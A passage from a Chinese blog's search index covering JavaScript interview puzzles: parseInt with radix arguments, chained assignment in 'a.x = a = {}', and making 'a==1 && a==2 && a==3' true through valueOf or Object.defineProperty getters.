<li>上面的代码可以拆分为下面的  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parseInt(1,0)&#x2F;&#x2F;根据文档前面是1，后面是0，这个就代表把1按照十进制转换</span><br><span class="line">parseInt(2,1)&#x2F;&#x2F;把2按照1进制转换，那么就是NaN</span><br><span class="line">parseInt(3,2)&#x2F;&#x2F;把2按照2进制转换，就是NaN</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li>代码   <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">name</span>: <span class="string">'a'</span>&#125;</span><br><span class="line">a.x = a = &#123;&#125;</span><br></pre></td></tr></table></figure>
 问 a.x 是多少？<br>答案<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure>
<ul>
<li>因为右边的a已经被重新赋值为空对象。左边的a是另外一个a，这里先执行点操作符，然后再赋值。所以就是undefined。详细可以看我之前的<a href="https://zhuanlan.zhihu.com/p/59835538" target="_blank" rel="noopener">笔记——JS类型转换、内存图、GC、深/浅拷贝</a></li>
</ul>
</li>
<li>(a ==1 &amp;&amp; a== 2 &amp;&amp; a==3) 可能为 true 吗？<br>利用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Equality_comparisons_and_sameness" target="_blank" rel="noopener">==</a> 会调用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf" target="_blank" rel="noopener">valueOf()</a> 和<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/toString" target="_blank" rel="noopener">toString()</a>的特性  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line"> value: <span class="number">1</span>,</span><br><span class="line"> valueOf()&#123;<span class="comment">//这里改成toString()也可以实现</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.value++</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">a ==<span class="number">1</span> &amp;&amp; a== <span class="number">2</span> &amp;&amp; a==<span class="number">3</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<ul>
<li>学习参考<a href="https://codeburst.io/javascript-can-a-1-a-2-a-3-ever-evaluate-to-true-aca13ff4462d" target="_blank" rel="noopener">JavaScript: Can (a==1 &amp;&amp; a==2 &amp;&amp; a==3) ever evaluate to true?</a><br>利用 a 会读取 window.a 的特性,这里用到<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty" target="_blank" rel="noopener">Object.defineProperty()</a>,这里就算<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Equality_comparisons_and_sameness" target="_blank" rel="noopener">三个等于的严格等于号</a>也可以实现<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> value = <span class="number">1</span>; </span><br><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">'a'</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span>()&#123;</span><br><span class="line">        <span class="keyword">return</span> value++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">a ==<span class="number">1</span> &amp;&amp; a== <span class="number">2</span> &amp;&amp; a==<span class="number">3</span> <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 或者 </span></span><br><span class="line">a ===<span class="number">1</span> &amp;&amp; a=== <span class="number">2</span> &amp;&amp; a===<span class="number">3</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<ul>
<li>测试结果可以<a href="https://jsbin.com/nedotujoke/1/edit?js,output" target="_blank" rel="noopener">看这里</a></li>
</ul>
]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
</search>
